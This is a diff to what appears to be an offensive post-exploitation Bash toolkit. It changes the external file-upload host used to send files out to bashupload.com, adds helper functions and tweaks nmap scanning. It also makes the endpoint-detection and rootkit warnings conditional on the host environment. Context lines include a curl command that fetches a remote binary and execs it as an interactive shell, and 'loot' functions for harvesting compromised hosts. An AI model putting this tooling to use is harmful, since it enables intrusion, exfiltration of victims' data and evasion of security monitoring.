@@ -395,7 +395,8 @@ xor() {
 xorpipe() { xor "${1:-0xfa}" | sed 's/\r/\n/g'; }
 
 # HS_TRANSFER_PROVIDER="transfer.sh"
-HS_TRANSFER_PROVIDER="oshi.at"
+# HS_TRANSFER_PROVIDER="oshi.at"
+HS_TRANSFER_PROVIDER="bashupload.com"
 
 transfer() {
     local opts=("-SsfL" "--connect-timeout" "7" "--progress-bar" "-T")
@@ -425,6 +426,8 @@ command -v shred >/dev/null || shred() {
     dd status=none bs=1k count="$(du -sk "${1:?}" | cut -f1)" if=/dev/urandom >"$1"
     rm -f "${1:?}"
 }
+
+command -v strings >/dev/null || strings() { perl -nle 'print $& while m/[[:print:]]{8,}/g' "$@"; }
 
 bounceinit() {
     [[ -n "$_is_bounceinit" ]] && return
@@ -1403,8 +1406,10 @@ lootlight() {
         echo -e "${CN}"
     }
 
-    _warn_edr
-    _warn_rk
+    [ ! -d /sf ] && {
+        _warn_edr
+        _warn_rk
+    }
 }
 
 _lootmore_last() {
@@ -1964,6 +1969,11 @@ ${CY}>>>>> ${CDC}curl -obash -SsfL '$str' && chmod 700 bash && exec ./bash -il"
     hs_init_dl
 }
 
+# Filter: Show only IPv4 addresses
+ipf() {
+    grep --color=never -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"
+}
+
 # Show CN and SAN of remote server
 cn() {
     local str
@@ -1997,7 +2007,7 @@ _scan_single() {
 
     [ -f "$2" ] && opt=("-iL" "$2")
     # Redirect "Unable to find nmap-services" to /dev/null
-    nmap -Pn -p"${1}" --open -T4 -n -oG - "${opt[@]}" 2>/dev/null | grep -F Ports
+    nmap -Pn -p"${1}" --open -T4 --max-retries 3 -n -oG - "${opt[@]}" 2>/dev/null | grep -F Ports
 }
 
 # scan <port> <IP or file> ...
@@ -2166,7 +2176,8 @@ hs_init_alias
 hs_init_shell
 
 [ -z "$QUIET" ] && {
-    xhelp
+    echo -e ">>> Type ${CDC}loot${CN} or ${CDC}xhelp${CN} to get your started"
+    # xhelp
 
     ### Finishing
     echo -e ">>> Type ${CDC}xhome${CN} to set HOME=${CDY}${XHOME}${CN}"
